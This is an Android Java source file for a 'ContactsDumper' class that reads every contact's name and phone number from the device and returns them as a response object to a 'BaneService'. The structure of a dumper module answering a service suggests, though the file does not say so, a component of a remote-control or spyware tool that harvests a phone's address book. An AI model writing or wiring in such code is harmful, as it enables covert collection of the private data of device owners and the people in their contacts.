package com.example.bane.bane.dumper;

import android.database.Cursor;
import android.provider.ContactsContract;
import androidx.annotation.NonNull;
import com.bane.model.BaneCode;
import com.bane.model.BaneObject;
import com.bane.model.BaneValue;
import com.example.bane.BaneService;
import java.util.ArrayList;
import java.util.Arrays;

public class ContactsDumper extends Dumper {
    @Override
    public BaneObject dump() {
        ArrayList<Contact> nameList = new ArrayList<>();
        Cursor phones = BaneService.context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            nameList.add(new Contact(name,phoneNumber));
        }
        phones.close();
        return new BaneObject(BaneCode.RESPONSE,"",new BaneValue[]{
           new BaneValue<String>("contacts", Arrays.toString(nameList.toArray()))
        });
    }
}

class Contact {

    public final String name;
    public final String phoneNumber;

    Contact(String name, String phoneNumber) {
        this.name = name;
        this.phoneNumber = phoneNumber;
    }

    @NonNull
    @Override
    public String toString() {
        return "name: "+name+" phone: "+phoneNumber+"\n";
    }
}